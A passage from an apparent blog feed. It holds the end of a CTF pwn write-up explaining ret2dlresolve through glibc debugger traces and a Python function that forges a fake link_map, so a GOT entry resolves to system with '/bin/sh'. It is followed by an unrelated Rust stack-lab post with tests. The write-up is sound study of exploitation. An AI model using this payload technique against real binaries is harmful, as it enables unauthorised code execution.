<h3 id="No-way-to-leak！"><a href="#No-way-to-leak！" class="headerlink" title="No way to leak！"></a>No way to leak！</h3><p>题目是一个直白的足够大的栈溢出，给了pop rdi ret 的gadget，但是除此之外实在是一干二净，没有backdoor没有libc，甚至连puts函数也没有，但是题目告知了此题应当用ret2dlresolve来解，<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/">wiki</a>上有讲解，<a href="https://www.cnblogs.com/Sta8r9/p/17732965.html">以及这篇博客</a></p>
<p>利用围绕着<code>_dl_runtime_reslove</code>这个函数，正常流程中：在程序首次调用一个函数时，会跳到plt表，然后跳转到got表，此时表为空未解析，接着跳转到PLT[0]，再跳入_dl_runtime_resolve，它会解析所调用的函数，然后更新got表，完成绑定并执行。</p>
<p>观察call read之后的过程：<br><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">► 0x401060       &lt;read@plt&gt;                        endbr64
  0x401064       &lt;read@plt+4&gt;                      bnd jmp qword ptr [rip + 0x2fb5]   &lt;0x401040&gt;
   ↓
  0x401040                                         endbr64
  0x401044                                         push   1
  0x401049                                         bnd jmp 0x401020                   &lt;0x401020&gt;
   ↓
  0x401020                                         push   qword ptr [rip + 0x2fe2]
  0x401026                                         bnd jmp qword ptr [rip + 0x2fe3]   &lt;_dl_runtime_resolve_xsavec&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>_dl_runtime_resolve参数为push到栈上的两个值，link_map和reloc_offset（函数在rel.plt上的偏移）</p>
<p>看一眼[rip + 0x2fe2]，在0x404008，其值为0x00007552d64e92e0</p>
<p>link_map结构如下：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">link_map</span>  <span class="token punctuation">&#123;</span>   
    <span class="token function">ElfW</span><span class="token punctuation">(</span>Addr<span class="token punctuation">)</span> l_addr<span class="token punctuation">;</span>     <span class="token comment">/*共享对象的加载基址；*/</span>            
    <span class="token keyword">char</span> <span class="token operator">*</span>l_name<span class="token punctuation">;</span>                
    <span class="token function">ElfW</span><span class="token punctuation">(</span>Dyn<span class="token punctuation">)</span> <span class="token operator">*</span>l_ld<span class="token punctuation">;</span>                   
    <span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token operator">*</span>l_next<span class="token punctuation">,</span> <span class="token operator">*</span>l_prev<span class="token punctuation">;</span> <span class="token comment">/*管理link_map的双链表指针；*/</span>
    <span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token operator">*</span>l_real<span class="token punctuation">;</span>        
    Lmid_t l_ns<span class="token punctuation">;</span>    
    <span class="token keyword">struct</span> <span class="token class-name">libname_list</span> <span class="token operator">*</span>l_libname<span class="token punctuation">;</span>     
    <span class="token function">ElfW</span><span class="token punctuation">(</span>Dyn<span class="token punctuation">)</span> <span class="token operator">*</span>l_info<span class="token punctuation">[</span>DT_NUM <span class="token operator">+</span> DT_THISPROCNUM <span class="token operator">+</span> DT_VERSIONTAGNUM <span class="token operator">+</span> DT_EXTRANUM <span class="token operator">+</span> DT_VALNUM <span class="token operator">+</span> DT_ADDRNUM<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">/*保存Elfxx_Dyn结构体指针的列表，用来寻找各节基址；如l_info[DT_STRTAB]指向保存着函数解析字符串表基址的Elfxx_Dyn结构体。*/</span>
    <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Phdr<span class="token punctuation">)</span> l_phdr<span class="token punctuation">;</span>          
    <span class="token function">ElfW</span><span class="token punctuation">(</span>Addr<span class="token punctuation">)</span> l_entry<span class="token punctuation">;</span>                 
    <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> l_phnum<span class="token punctuation">;</span>                   
    <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> l_ldnum<span class="token punctuation">;</span>                
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>接下来需要理解_dl_runtime_resolve如何利用link_map和offset完成符号解析，这一步主要依靠_dl_fixup部分完成，参数同上，返回真实地址</p>
<p>其中调用了_dl_lookup_symbol_x函数，可以看到：<br><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">► 0x7552d64c2bf7 &lt;_dl_fixup+263&gt;    call   _dl_lookup_symbol_x         &lt;_dl_lookup_symbol_x&gt;
       rdi: 0x3fe501 ◂— 0x6474730064616572 &#x2F;* &#39;read&#39; *&#x2F;
       rsi: 0x7552d64e92e0 ◂— 0
       rdx: 0x7fff15cca570 —▸ 0x3fe460 ◂— 0x1200000011
       rcx: 0x7552d64e9680 —▸ 0x7552d64e95d8 —▸ 0x7552d64ae6c0 —▸ 0x7552d64e92e0 ◂— 0
       r8: 0x7552d64ae710 —▸ 0x3fe52d ◂— &#39;GLIBC_2.2.5&#39;
       r9: 1
       arg[6]: 1
       arg[7]: 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>rdi中存的是.dynstr 段中的”read”字符串，rsi中是link_map首地址，rdx指向0x3fe460，是.dynsym 段对应read的部分：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">_dl_lookup_symbol_x</span> <span class="token punctuation">(</span>undef_name<span class="token operator">=</span><span class="token number">0x3fe501</span> <span class="token string">"read"</span><span class="token punctuation">,</span>
    undef_map<span class="token operator">=</span>undef_map@entry<span class="token operator">=</span><span class="token number">0x7552d64e92e0</span><span class="token punctuation">,</span>
    ref<span class="token operator">=</span>ref@entry<span class="token operator">=</span><span class="token number">0x7fff15cca570</span><span class="token punctuation">,</span> symbol_scope<span class="token operator">=</span><span class="token number">0x7552d64e9680</span><span class="token punctuation">,</span>
    version<span class="token operator">=</span><span class="token number">0x7552d64ae710</span><span class="token punctuation">,</span> type_class<span class="token operator">=</span>type_class@entry<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>
    skip_map<span class="token operator">=</span><span class="token number">0x0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>接下来考虑利用，也就是用假的link_map将read解析成system填入got表</p>
<p>此题的fake_link_map:<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fake_Linkmap_payload</span><span class="token punctuation">(</span>fake_linkmap_addr<span class="token punctuation">,</span>known_func_ptr<span class="token punctuation">,</span>offset<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># &amp;(2**64-1)是因为offset为负数，如果不控制范围，p64后会越界，发生错误</span>
    <span class="token comment"># offset = l_addr =  libc.sym['system'] -libc.sym['setbuf']  </span>
    <span class="token comment"># symbol_addr = setbuf_addr + (system_addr - setbuf_addr) = system_addr</span>
    <span class="token comment"># l_addr = -769472, 通常为负数</span>
    linkmap <span class="token operator">=</span> p64<span class="token punctuation">(</span>offset <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token number">64</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#l_addr</span>

    <span class="token comment"># fake_linkmap_addr + 8，也就是DT_JMPREL，至于为什么有个0，可以参考IDA上.dyamisc的结构内容</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># 可以为任意值</span>

    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># 这里的值就是伪造的.rel.plt的地址</span>

    <span class="token comment"># fake_linkmap_addr + 0x18,fake_rel_write,因为write函数push的索引是0，也就是第一项</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">0x30</span> <span class="token operator">-</span> offset<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token number">64</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># Rela->r_offset,正常情况下这里应该存的是got表对应条目的地址，解析完成后在这个地址上存放函数的实际地址，此处我们只需要设置一个可读写的地址即可 </span>

    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span>     <span class="token comment"># Rela->r_info,用于索引symtab上的对应项，7>>32=0，也就是指向symtab的第一项</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token comment"># Rela->r_addend,任意值都行</span>

    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token comment">#l_ns</span>

    <span class="token comment"># fake_linkmap_addr + 0x38, DT_SYMTAB </span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># 参考IDA上.dyamisc的结构</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span>known_func_ptr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token comment"># 这里的值就是伪造的symtab的地址,为已解析函数的got表地址-0x8</span>

    linkmap <span class="token operator">+=</span> <span class="token string">b'/bin/sh\x00'</span>
    linkmap <span class="token operator">=</span> linkmap<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token punctuation">)</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_linkmap_addr<span class="token punctuation">)</span> <span class="token comment"># fake_linkmap_addr + 0x68, 对应的值的是DT_STRTAB的地址，由于我们用不到strtab，所以随意设置了一个可读区域</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">)</span> <span class="token comment"># fake_linkmap_addr + 0x70 , 对应的值是DT_SYMTAB的地址</span>
    linkmap <span class="token operator">=</span> linkmap<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token punctuation">)</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token comment"># fake_linkmap_addr + 0xf8, 对应的值是DT_JMPREL的地址</span>
    <span class="token keyword">return</span> linkmap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>（有待进一步学习，yield()）</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;一份&lt;del&gt;迟到的&lt;/del&gt;不必要的WP，同时也是回顾si进pwn的世界的第一个月&lt;/p&gt;
&lt;h3 id=&quot;0-二进制漏洞审计入门指北&quot;&gt;&lt;a href=&quot;#0-二进制漏洞审计入门指北&quot; class=&quot;headerlink&quot; title=&quot;0</summary>
        
      
    
    
    
    <category term="ctf" scheme="https://aucept.in/categories/ctf/"/>
    
    
    <category term="pwn" scheme="https://aucept.in/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>数据结构-栈实验</title>
    <link href="https://aucept.in/2025/10/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%A0%88%E5%AE%9E%E9%AA%8C/"/>
    <id>https://aucept.in/2025/10/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%A0%88%E5%AE%9E%E9%AA%8C/</id>
    <published>2025-10-13T02:42:03.000Z</published>
    <updated>2025-10-18T05:48:00.544Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h2><p>一个栈结构体要有：<code>栈底指针``栈顶指针``可用最大容量</code>三个字段……指针是什么东西啊？rust崩溃</p>
<p>换个角度想，栈就是只能在一端进行增删操作的线性表，course.rs里给出了单向链表的实现，但为何非要链表？也许可以用Box模拟：</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">struct</span> <span class="token type-definition class-name">Stack</span> <span class="token punctuation">&#123;</span>
    base <span class="token punctuation">:</span> <span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token punctuation">[</span><span class="token keyword">i32</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">,</span>
    top <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>
    size <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Box&lt;[i32]&gt;分配一个堆上的定长i32切片，但是定长并不能满足需求，大致有两种思路，一是利用vec完成不定长的部分再转换回定长切片，二是利用unsafe代码手动分配内存</p>
<p>使用vec!来简化实现：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">impl</span> <span class="token class-name">Stack</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span>size <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span><span class="token keyword">Self</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> base  <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">;</span> size<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">into_boxed_slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Stack</span><span class="token punctuation">&#123;</span>
            base<span class="token punctuation">,</span>
            top <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
            size<span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">realloc</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> new_size <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>size <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> base <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">;</span> new_size<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">into_boxed_slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span><span class="token keyword">self</span><span class="token punctuation">.</span>size <span class="token punctuation">&#123;</span>
            base<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>base<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>base <span class="token operator">=</span> base<span class="token punctuation">;</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>size <span class="token operator">=</span> new_size<span class="token punctuation">;</span>
        <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> value <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// full</span>
        <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>top <span class="token operator">>=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>size <span class="token punctuation">&#123;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">realloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// push</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>base<span class="token punctuation">[</span><span class="token keyword">self</span><span class="token punctuation">.</span>top<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"top: &#123;&#125;"</span><span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>top<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>top <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">pop</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// empty</span>
        <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>top <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token class-name">Err</span><span class="token punctuation">(</span><span class="token macro property">anyhow!</span><span class="token punctuation">(</span><span class="token string">"Stack underflow"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>top <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>base<span class="token punctuation">[</span><span class="token keyword">self</span><span class="token punctuation">.</span>top<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>测试如下：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[cfg(test)]</span>
<span class="token keyword">mod</span> <span class="token module-declaration namespace">tests</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token keyword">super</span><span class="token punctuation">::</span><span class="token class-name">Stack</span><span class="token punctuation">;</span>
    <span class="token keyword">use</span> <span class="token namespace">anyhow<span class="token punctuation">::</span></span><span class="token class-name">Result</span><span class="token punctuation">;</span>
    <span class="token comment">// new 后栈应为空，pop 应返回错误</span>
    <span class="token attribute attr-name">#[test]</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">test_new_initial_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> s <span class="token operator">=</span> <span class="token class-name">Stack</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">assert!</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"new stack should be empty"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// push 多个元素后，pop 应按 LIFO 返回</span>
    <span class="token attribute attr-name">#[test]</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">test_push_and_pop_lifo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> s <span class="token operator">=</span> <span class="token class-name">Stack</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
        s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
        s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">assert!</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"stack should be empty after popping all elements"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// push 的数量超过初始容量，验证能正常工作（隐式测试扩容）</span>
    <span class="token attribute attr-name">#[test]</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">test_push_resizes_and_handles_more_than_initial_capacity</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> s <span class="token operator">=</span> <span class="token class-name">Stack</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">1</span><span class="token punctuation">..=</span><span class="token number">10</span> <span class="token punctuation">&#123;</span>
            s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">..=</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rev</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token macro property">assert!</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"stack should be empty after popping all elements"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 单次 push 后 pop 返回相同值</span>
    <span class="token attribute attr-name">#[test]</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">test_push_single_then_pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> s <span class="token operator">=</span> <span class="token class-name">Stack</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">assert!</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"stack should be empty after popping the single element"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>接下来就可以正式开始实验了：</p>
<h2 id="（一）-数制转换问题"><a href="#（一）-数制转换问题" class="headerlink" title="（一） 数制转换问题"></a>（一） 数制转换问题</h2><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>将十进制数N和其它d进制数的转换是计算机实现计算的基本问题，其解决方案很多，其中最简单方法基于下列原理：即除d取余法。例如：（1348）10 = （2504）8</p>
<h4 id="10进制转换8进制过程"><a href="#10进制转换8进制过程" class="headerlink" title="10进制转换8进制过程"></a>10进制转换8进制过程</h4><div class="table-container">
<table>
<thead>
<tr>
<th>N</th>
<th>N div 8</th>
<th>N mod 8</th>
</tr>
</thead>
<tbody>
<tr>
<td>1348</td>
<td>168</td>
<td>4</td>
</tr>
<tr>
<td>168</td>
<td>21</td>
<td>0</td>
</tr>
<tr>
<td>21</td>
<td>2</td>
<td>5</td>
</tr>
<tr>
<td>2</td>
<td>0</td>
<td>2</td>
</tr>
</tbody>
</table>
</div>
<p>从表中可以看出，最先产生的余数4是转换结果的最低位，这正好符合栈的后进先出（LIFO）的特性。所以可以用顺序栈来模拟这个过程。</p>
<h4 id="基本要求"><a href="#基本要求" class="headerlink" title="基本要求"></a>基本要求</h4><p>对于键盘输入的任意一个非负的十进制整数，打印输出与其等值的八进制数。由于上述的计算过程是从低位到高位顺序产生的八进制数的各个数位，而打印输出，一般来说应从高位到低位进行，恰好和计算过程相反。因此可以先将计算过程中得到的八进制数的各位进栈，待相对应的八进制数的各位均产生以后，再使其按顺序出栈，并打印输出。即得到了与输入的十进制数相对应的八进制数。</p>
